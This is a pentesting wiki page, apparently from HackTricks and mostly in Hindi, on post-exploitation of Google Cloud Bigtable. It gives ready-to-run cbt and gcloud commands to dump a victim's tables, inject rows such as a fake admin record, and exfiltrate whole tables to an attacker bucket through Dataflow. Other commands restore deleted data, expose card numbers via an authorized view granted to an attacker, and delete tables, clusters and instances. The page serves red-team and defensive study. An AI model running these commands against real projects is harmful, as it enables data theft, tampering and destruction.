# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> `cbt` CLI को Cloud SDK के माध्यम से एक बार इंस्टॉल करें ताकि नीचे दिए गए कमांड्स स्थानीय रूप से काम करें:
>
> <details>
>
> <summary>cbt CLI इंस्टॉल करें</summary>
>
> ```bash
> gcloud components install cbt
> ```
>
> </details>

### पंक्तियाँ पढ़ें

**अनुमतियाँ:** `bigtable.tables.readRows`

`cbt` Cloud SDK के साथ आता है और किसी मध्यवर्ती सॉफ़्टवेयर की आवश्यकता के बिना admin/data APIs से संवाद करता है। इसे compromised project/instance पर पॉइंट करें और तालिका से सीधे rows dump करें। यदि आपको केवल एक नज़र चाहिए तो scan सीमित करें।

<details>

<summary>Bigtable entries पढ़ें</summary>
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
</details>

### पंक्तियाँ लिखें

**अनुमतियाँ:** `bigtable.tables.mutateRows`, (आपको परिवर्तन की पुष्टि करने के लिए `bigtable.tables.readRows` की आवश्यकता होगी).

उसी टूल का उपयोग arbitrary cells को upsert करने के लिए करें। यह configs में backdoor लगाने, web shells डालने, या poisoned dataset rows प्लांट करने का सबसे तेज़ तरीका है।

<details>

<summary>दुष्ट पंक्ति इंजेक्ट करें</summary>
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
</details>

`cbt set` कच्चे बाइट्स को `@/path` सिंटैक्स के माध्यम से स्वीकार करता है, इसलिए आप compiled payloads या serialized protobufs ठीक वैसे ही push कर सकते हैं जैसे downstream services उनसे उम्मीद करते हैं।

### अपनी bucket में rows डंप करें

**अनुमतियाँ:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

Dataflow job लॉन्च करके जो rows को आपके नियंत्रित GCS bucket में stream करता है, attacker द्वारा नियंत्रित bucket में पूरे table की सामग्री exfiltrate करना संभव है।

> [!NOTE]
> ध्यान दें कि export पूरा करने के लिए पर्याप्त permissions वाले किसी SA पर आपको `iam.serviceAccounts.actAs` permission की आवश्यकता होगी (डिफ़ॉल्ट रूप से, यदि अन्यथा निर्दिष्ट नहीं है, तो डिफ़ॉल्ट compute SA का उपयोग किया जाएगा)।

<details>

<summary>Bigtable को GCS bucket में Export करें</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

> [!NOTE]
> टेम्पलेट को `Cloud_Bigtable_to_GCS_Parquet` या `Cloud_Bigtable_to_GCS_SequenceFile` में बदलें यदि आप JSON के बजाय Parquet/SequenceFile आउटपुट चाहते हैं। अनुमतियाँ वही रहेंगी; केवल टेम्पलेट पथ बदलता है।

### पंक्तियाँ आयात करें

**अनुमतियाँ:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

यह संभव है कि attacker द्वारा नियंत्रित बकेट से पूरे टेबल की सामग्री को आयात किया जाए, एक Dataflow job लॉन्च करके जो पंक्तियों को आपके नियंत्रित GCS बकेट में स्ट्रीम करे। इसके लिए attacker को पहले अपेक्षित schema के साथ आयात करने के लिए data वाला एक parquet फ़ाइल बनानी होगी। एक attacker पहले पिछले तकनीक का अनुसरण करते हुए डेटा को parquet फ़ॉर्मेट में export कर सकता है, सेटिंग `Cloud_Bigtable_to_GCS_Parquet` के साथ, और डाउनलोड की गई parquet फ़ाइल में नए एंट्री जोड़ सकता है।

> [!NOTE]
> ध्यान दें कि आपको export को निष्पादित करने के लिए पर्याप्त permissions वाले किसी SA पर `iam.serviceAccounts.actAs` permission की आवश्यकता होगी (डिफ़ॉल्ट रूप से, यदि अन्यथा निर्दिष्ट नहीं है, तो default compute SA का उपयोग किया जाएगा)।

<details>

<summary>Import from GCS bucket to Bigtable</summary>
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
</details>

### बैकअप पुनर्स्थापना

**अनुमतियाँ:** `bigtable.backups.restore`, `bigtable.tables.create`.

एक हमलावर जिनके पास ये अनुमतियाँ हैं, वे अपने नियंत्रण में एक नए table में बैकअप पुनर्स्थापित कर सकते हैं ताकि पुराने संवेदनशील डेटा को पुनर्प्राप्त किया जा सके।

<details>

<summary>Bigtable बैकअप पुनर्स्थापित करें</summary>
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
</details>

### टेबल्स को पुनर्स्थापित करें

**अनुमतियाँ:** `bigtable.tables.undelete`

Bigtable soft-deletion का समर्थन करता है और इसमें एक ग्रेस पीरियड होता है (आमतौर पर डिफ़ॉल्ट रूप से 7 दिन)। इस अवधि के दौरान, `bigtable.tables.undelete` अनुमति रखने वाला एक हमलावर हाल ही में हटाए गए टेबल को पुनर्स्थापित कर सकता है और उसके सभी डेटा को पुनर्प्राप्त कर सकता है, जिससे उन संवेदनशील सूचनाओं तक पहुँच संभव हो सकती है जिन्हें नष्ट माना जा रहा था।

यह विशेष रूप से उपयोगी है:
- incident response के दौरान रक्षा टीम द्वारा हटाए गए टेबल्स से डेटा पुनर्प्राप्त करना
- जानबूझकर हटाए गए ऐतिहासिक डेटा तक पहुँच
- दुर्घटनावश या दुर्भावनापूर्ण हटाने को पूर्ववत करना ताकि persistence बनाए रखा जा सके

<details>

<summary>Bigtable टेबल को पुनर्स्थापित करें</summary>
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
</details>

> [!NOTE]
> undelete ऑपरेशन केवल कॉन्फ़िगर किए गए रिटेंशन अवधि (डिफ़ॉल्ट 7 दिनों) के भीतर ही काम करता है। इस विंडो के समाप्त होने के बाद, तालिका और उसके डेटा स्थायी रूप से हटा दिए जाते हैं और इस विधि के माध्यम से पुनर्प्राप्त नहीं किए जा सकते।


### अधिकृत व्यू बनाएं

**अनुमतियाँ:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

अधिकृत व्यू आपको तालिका का एक क्यूरेट किया हुआ उपसमुच्चय प्रस्तुत करने देते हैं। least privilege का पालन करने के बजाय, इनका उपयोग उन **ठीक वही संवेदनशील कॉलम/रो सेट्स** को प्रकाशित करने के लिए करें जिनकी आपको आवश्यकता है और अपने स्वयं के principal को व्हाइटलिस्ट करें।

> [!WARNING]
> असल में, एक अधिकृत व्यू बनाने के लिए आपको बेस तालिका में rows पढ़ने और mutate करने में सक्षम होना भी आवश्यक है; इसलिए आप कोई अतिरिक्त अनुमति प्राप्त नहीं कर रहे हैं, इसलिए यह तकनीक ज्यादातर बेकार है।

<details>

<summary>अधिकृत व्यू बनाएं</summary>
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
</details>

क्योंकि एक्सेस view तक सीमित होता है, सुरक्षा टीमें अक्सर इस बात की अनदेखी कर देती हैं कि आपने अभी एक नया high-sensitivity endpoint बना लिया है।

### Authorized Views पढ़ें

**अनुमतियाँ:** `bigtable.authorizedViews.readRows`

यदि आपके पास किसी Authorized View तक पहुँच है, तो आप अपने read अनुरोधों में authorized view नाम निर्दिष्ट करके Bigtable client libraries का उपयोग कर उससे डेटा पढ़ सकते हैं। ध्यान दें कि authorized view संभवतः उस तालिका से आप क्या एक्सेस कर सकते हैं, इसे सीमित करेगा। नीचे Python का एक उदाहरण दिया गया है:

<details>

<summary>Authorized view से पढ़ें (Python)</summary>
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
</details>

### Denial of Service via Delete Operations

**अनुमतियाँ:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Bigtable की किसी भी delete permissions का उपयोग denial of service attacks के लिए weaponize किया जा सकता है। इन permissions वाले attacker महत्वपूर्ण Bigtable resources को delete करके ऑपरेशन्स में बाधा डाल सकते हैं:

- **`bigtable.appProfiles.delete`**: application profiles को delete करना, जिससे client connections और routing configurations टूट सकते हैं
- **`bigtable.authorizedViews.delete`**: authorized views को हटाना, जिससे applications के वैध पहुंच मार्ग कट सकते हैं
- **`bigtable.authorizedViews.deleteTagBinding`**: authorized views से tag bindings हटाना
- **`bigtable.backups.delete`**: backup snapshots को नष्ट करना, जिससे disaster recovery विकल्प समाप्त हो जाते हैं
- **`bigtable.clusters.delete`**: पूरे clusters को delete करना, जिससे तुरंत डेटा अनुपलब्ध हो सकता है
- **`bigtable.instances.delete`**: संपूर्ण Bigtable instances को हटाना, सभी tables और configurations को मिटा देना
- **`bigtable.tables.delete`**: व्यक्तिगत tables को delete करना, जिससे डेटा हानि और application failures हो सकते हैं

<details>

<summary>Delete Bigtable resources</summary>
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
</details>

> [!WARNING]
> डेटा हटाने के ऑपरेशन अक्सर त्वरित और अपरिवर्तनीय होते हैं। परीक्षण करने से पहले बैकअप सुनिश्चित करें, क्योंकि ये स्थायी डेटा हानि और गंभीर सेवा व्यवधान का कारण बन सकते हैं।

{{#include ../../../banners/hacktricks-training.md}}
